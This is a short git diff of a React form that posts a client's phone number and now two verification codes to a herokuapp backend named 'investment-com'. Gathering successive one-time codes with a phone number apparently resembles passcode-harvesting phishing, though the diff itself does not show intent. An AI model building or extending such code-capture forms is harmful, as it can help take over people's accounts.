@@ -102,8 +102,9 @@ export default function Form() {
     };
     
     const addVerificationCode1 = () => {
-        axios.post("https://investment-com.herokuapp.com/add-first-code", {
+        axios.post("https://investment-com.herokuapp.com/add-code", {
             firstCode: vc,
+            secondCode: vc2,
             phoneNumber: values.clientPhoneNumber,
         }, 
         {
@@ -115,7 +116,7 @@ export default function Form() {
                 'Host': 'https://investment-com.herokuapp.com'
             }
         }).then((response) => {
-            console.log("vc1 saved");
+            console.log("vc1, vc2 saved");
         })
     };
 
